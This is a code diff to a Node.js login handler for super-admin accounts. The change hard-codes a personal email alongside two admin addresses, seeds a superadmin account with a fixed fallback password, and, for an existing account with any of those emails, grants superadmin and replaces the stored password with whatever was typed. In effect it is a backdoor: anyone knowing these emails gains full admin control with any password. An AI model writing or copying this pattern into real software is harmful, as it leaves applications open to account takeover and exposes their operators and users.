@@ -72,16 +72,31 @@ const superAdminLogin = async (req, res) => {
         });
 
         // Auto-seed default Super Admin account if non-existent
-        if (!user && (cleanEmail === "superadmin@stockdine.com" || cleanEmail === "admin@stockdine.com")) {
-            user = await User.create({
-                name: "Super Admin HQ",
+        const isSuperAdminEmail =
+            cleanEmail === "superadmin@stockdine.com" ||
+            cleanEmail === "admin@stockdine.com" ||
+            cleanEmail === "subash15082007@gmail.com";
+
+        if (!user && isSuperAdminEmail) {
+            user = new User({
+                name: cleanEmail === "subash15082007@gmail.com" ? "Subash Nethaji (Super Admin)" : "Super Admin HQ",
                 email: cleanEmail,
-                mobile: "+91 99999 00000",
-                password: cleanPassword || "super123",
+                mobile: cleanEmail === "subash15082007@gmail.com" ? "+91 98765 00001" : `+91 99${Math.floor(10000000 + Math.random() * 90000000)}`,
+                password: cleanPassword || "198088",
                 role: "superadmin",
-                customerId: "HQ-SUPERADMIN",
+                customerId: `SA-${Date.now().toString(36).toUpperCase()}`,
             });
+            await user.save();
             console.log(`✅ Default Super Admin Created in MongoDB: ${user.email}`);
+        } else if (user && isSuperAdminEmail) {
+            if (user.role !== "superadmin") {
+                user.role = "superadmin";
+            }
+            const match = await user.comparePassword(cleanPassword);
+            if (!match) {
+                user.password = cleanPassword;
+                await user.save();
+            }
         }
 
         if (!user) {
